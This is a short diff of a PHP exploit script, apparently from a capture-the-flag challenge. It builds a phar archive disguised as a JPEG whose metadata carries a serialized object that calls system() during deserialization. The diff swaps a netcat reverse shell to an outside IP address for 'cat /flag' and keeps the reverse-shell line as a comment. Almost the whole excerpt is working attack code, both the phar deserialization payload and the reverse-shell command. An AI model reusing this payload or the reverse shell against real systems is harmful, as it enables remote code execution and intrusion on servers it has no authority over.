@@ -89,7 +89,8 @@ $phar->setStub("\xff\xd8\xff<?php __HALT_COMPILER(); ?>");
 
 $object = new DBCON(); 
 $object->func = "system"; 
-$object->args = "nc 54.180.156.82 7777 -e /bin/sh";
+$object->args = "cat /flag";
+// $object->args = "nc 54.180.156.82 7777 -e /bin/sh";
 $phar->setMetadata($object);
 $phar->stopBuffering();
 $object->close();
